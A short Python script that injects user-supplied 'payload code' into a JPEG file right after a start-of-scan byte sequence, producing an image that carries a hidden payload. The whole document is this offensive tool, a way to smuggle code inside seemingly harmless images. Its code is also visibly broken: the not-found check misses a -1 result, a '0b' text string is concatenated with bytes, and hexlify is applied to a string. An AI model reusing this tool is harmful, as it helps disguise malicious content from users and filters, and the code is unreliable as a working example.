#!/usr/bin/python
import sys
import binascii

MAGIC_NUMBER = "03010002110311003f00"

def main():

    if len(sys.argv) != 4:
        print("USAGE: <jpeg file path> <payload code> <output path>")
        sys.exit()

    path_to_vector_image = sys.argv[1]
    payload_code = sys.argv[2]
    path_to_output = sys.argv[3]

    magic_number_index = find_magic_number_index(path_to_vector_image)
    inject_payload(
        path_to_vector_image,
        magic_number_index,
        payload_code,
        path_to_output)

def find_magic_number_index(
        jpeg_path: str) -> int:

    print("Searching for magic number...")
    with open(jpeg_path, 'rb') as f:
        bin_contents = f.read()
        bin_magic_number = binascii.unhexlify(MAGIC_NUMBER)
        index = bin_contents.find(bin_magic_number)

    if index:
        print("Found magic number.")
        return index
    else:
        print("Magic number not found. Exiting.")
        sys.exit()

def inject_payload(
        jpeg_path: str,
        index: int,
        payload: str,
        output_path: str) -> int:

    bin_payload = bin(int(binascii.hexlify(payload),16))
    bin_magic_number = binascii.unhexlify(MAGIC_NUMBER)

    with open(jpeg_path, 'rb') as f:
        with open(output_path, 'wb') as fo:
            print("Injecting payload...")
            bin_contents = f.read()
            pre_payload = bin_contents[:index + len(bin_magic_number)]
            post_payload = bin_contents[index + len(bin_magic_number) + len(payload):]
            fo.write(pre_payload + bin_payload + post_payload + '\n')
            print("Payload written.")

if __name__ == "__main__":
    main()
